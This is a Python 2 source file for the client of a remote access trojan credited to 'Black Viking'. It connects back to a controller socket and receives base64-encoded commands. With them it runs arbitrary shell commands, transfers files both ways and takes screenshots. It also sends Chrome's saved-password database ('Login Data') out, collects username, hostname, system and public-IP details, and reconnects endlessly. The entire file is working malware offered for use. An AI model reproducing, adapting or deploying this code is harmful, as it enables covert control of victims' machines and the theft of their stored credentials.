#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
"""

END_OF_FILE = "(((END_OF_FILE)))"

import ctypes
import socket
import subprocess
import os
import sys
import base64
import threading
import urllib2
import re
import getpass
import platform
import time
import re

if os.name == "nt":
    import ctypes
    from mss.windows import MSS as mss
    sct = mss()
else:
    pass

HOST = '127.0.0.1'
PORT = int('8000')

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(data):
    s.sendall(crypt(os.getcwd()))
    s.sendall(crypt(data))

def download(command):
    fileName = command.replace("upload ", "")

    f = open(fileName, 'wb')
    while True:
        l = s.recv(1024)
        while l:
            if l.endswith(END_OF_FILE):
                if END_OF_FILE in l:
                    # removing END_OF_FILE flag
                    l = l.replace(END_OF_FILE, "")
                f.write(l)
                args = "[+] Upload complete!"
                s.sendall(crypt(args))
                break
            else:
                f.write(l)
                l = s.recv(1024)
        break
    f.close()
    main()

def upload(command):
    if "screenshot() download " in command:
        fileName = command.replace("screenshot() download ", "")

    else:
        fileName = command.replace("download ", "")
    try:
        f = open(fileName, 'rb')
        l = f.read(1024)

        while (l):
            s.send(l)
            l = f.read(1024)
        f.close()
        s.send(END_OF_FILE)
        if "screenshot() download " in command:
            os.remove(fileName)
        main()

    except IOError:
        s.sendall("File not found\n")
        main()

def screenshot(command):
    if os.name == "nt":
        fileName = command.replace("screenshot() ", "")
        for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
            pass
        upload(command)
    else:
        s.sendall("[!] This func, works only on Windows!\n")
        main()

def chrome_db():
    global db_name
    if os.name == "nt":
        db_name = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
        upload("download %s"%(db_name))
    else:
        s.sendall("[!] This func, works only on Windows!\n")
        main()

def messageBox(text):
    title = text
    t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
    t.daemon=True
    t.start()
    
def info():
    try:
        ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
    except:
        ip = "x.x.x.x"
        pass    

    message = """
[>] Username\t: %s
[>] Hostname\t: %s
[>] System\t: %s
[>] Date\t: %s
[>] IP Adress\t: %s
"""%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
    send(message)

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        send(socket.gethostname())
    except:
        connect()

    

def main():
    while True:
        command = crypt(s.recv(1024), False)
        if command[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(command[3:].decode("utf-8"))
                send(" ")
            except OSError:
                send("%s: No such file or directory"%(command[3:]))

        elif command == "info()":
            info()
            main()

        elif "upload" in command:
            download(command)

        elif "download" in command and "screenshot()" not in command and "chrome_db" not in command:
            upload(command)

        elif "screenshot()" in command:
            screenshot(command)

        elif command == "download chrome_db":
            chrome_db()

        elif "execute" in command:
            command = command.replace("execute ", "")
            subprocess.Popen(command, shell=True)
            send("Running program in a new process\n")
            
        elif "message" in command:
            messageBox(command.replace("message ", ""))
            send(" ")
            
        elif command == "pwd":
            send(os.getcwd()+"\n")

        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            if output == "":
                output = " "
            send(output)
            
    s.close()

def start():
    while True:
        try:
            connect()
            main()
        except Exception as e:
            print e
            start()

if __name__ == "__main__":
    start()
